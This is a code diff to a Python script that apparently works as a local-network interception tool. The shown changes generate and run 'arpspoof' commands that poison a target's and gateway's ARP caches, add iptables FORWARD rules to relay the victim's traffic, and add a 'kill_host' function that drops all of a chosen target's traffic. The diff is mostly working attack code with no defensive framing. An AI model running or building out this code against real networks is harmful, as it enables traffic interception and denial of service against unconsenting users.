@@ -24,6 +24,12 @@ def port_forward_commands(target_ip, gateway_ip):
     return portforward_commands
 
 
+def kill_host(target_ip):
+    kill_host_commands = [
+        f"iptables -A FORWARD -s {target_ip} -j DROP",
+    ]
+    return kill_host_commands
+
 def arp_spoof_host_IPs(target_ip, gateway_ip, selected_interface):
     """
     Generate ARP spoofing commands to target a specific IP address.
@@ -36,6 +42,8 @@ def arp_spoof_host_IPs(target_ip, gateway_ip, selected_interface):
     Returns:
         list: A list of ARP spoofing commands.
     """
+    print(f"\n\n\nTARGET IP == {target_ip}")
+    print(f"GATEWAY IP == {gateway_ip}")
     # ARP spoofing commands targeting both directions
     arpspoof_commands = [
         f"gnome-terminal -- sudo arpspoof -i {selected_interface} -t {target_ip} {gateway_ip}",
@@ -61,15 +69,15 @@ def stop_arpspoof(ip_address):
             try:
                 # Send SIGINT signal (CTRL+C) to the ARP spoofing process
                 os.kill(int(pid), 2)
-                print(f"Sent CTRL+C signal to process with PID {pid}")
+                print(f"[+] Sent CTRL+C signal to process with PID {pid}")
             except ProcessLookupError:
-                print(f"Process with PID {pid} not found.")
+                print(f"[-] Process with PID {pid} not found.")
         
         # Remove IP address entry from the IP-PID map
         del ip_pid_map[ip_address]
-        print(f"ARP spoofing stopped for IP address {ip_address}")
+        print(f"[!] ARP spoofing stopped for IP address {ip_address}")
     else:
-        print(f"No ARP spoofing process found for IP address {ip_address}")
+        print(f"[-] No ARP spoofing process found for IP address {ip_address}")
 
 
 def run_arpspoof(ip_address, gateway_ip, interface):
@@ -85,7 +93,7 @@ def run_arpspoof(ip_address, gateway_ip, interface):
     global ip_pid_map
     # Check if there's an active sniffer for the given IP address
     if not check_sniffer_active(ip_address):
-        print("\nARP spoofing for ip:", ip_address, "\n")
+        print("\n[+] ARP spoofing for ip:", ip_address, "\n")
         # Generate ARP spoofing commands
         arpspoof_commands = arp_spoof_host_IPs(ip_address, gateway_ip, interface)
         arpspoof_processes = []
@@ -107,29 +115,34 @@ def run_arpspoof(ip_address, gateway_ip, interface):
             threads.append(thread)
             thread.start()
 
-        all_portforward_commands_succeeded = True
+        # Check if the port forwarding rules already exist
+        port_forward_rules_exist = False
+        check_rules_commands = [
+            f"iptables -C FORWARD -s {gateway_ip} -d {ip_address} -j ACCEPT",
+            f"iptables -C FORWARD -s {ip_address} -d {gateway_ip} -j ACCEPT",
+            f"iptables -C FORWARD -j ACCEPT"
+        ]
+        for command in check_rules_commands:
+            result = subprocess.run(command, shell=True)
+            if result.returncode == 0:
+                port_forward_rules_exist = True
+                break
 
-        port_forwarding_commands = port_forward_commands(ip_address, gateway_ip)
-        for portforward_command in port_forwarding_commands:
-            subprocess.run(portforward_command, shell=True)
-
-        # Execute the portforward commands
-        for portforward_command in port_forwarding_commands:
-            result = subprocess.run(portforward_command, shell=True)
-            if result.returncode != 0:
-                all_portforward_commands_succeeded = False
-                print(f"\n\n[-] Error: Command '{portforward_command}' failed with return code {result.returncode}\n\n")
-
-        if all_portforward_commands_succeeded:
-            print("[+] All commands executed successfully.")
-
+        # If the rules don't exist, add them
+        if not port_forward_rules_exist:
+            print("\n\n\nRULES DONT EXIST\n\n\n")
+            port_forwarding_commands = port_forward_commands(ip_address, gateway_ip)
+            for portforward_command in port_forwarding_commands:
+                subprocess.run(portforward_command, shell=True)
+        elif port_forward_rules_exist:
+            print("\nRULES EXIST\n\n\n")
 
         # Wait for the threads to start before getting the PID
         time.sleep(1)
 
         # Get the PID after threads have started
         pids_from_arpspoof = subprocess.run(["pgrep", "arpspoof"], capture_output=True, text=True).stdout.splitlines()
-    
+
         # Filter out the PIDs that are not already linked to the IP address
         new_pids = [pid for pid in pids_from_arpspoof if pid not in [pid for pids in ip_pid_map.values() for pid in pids]]
 
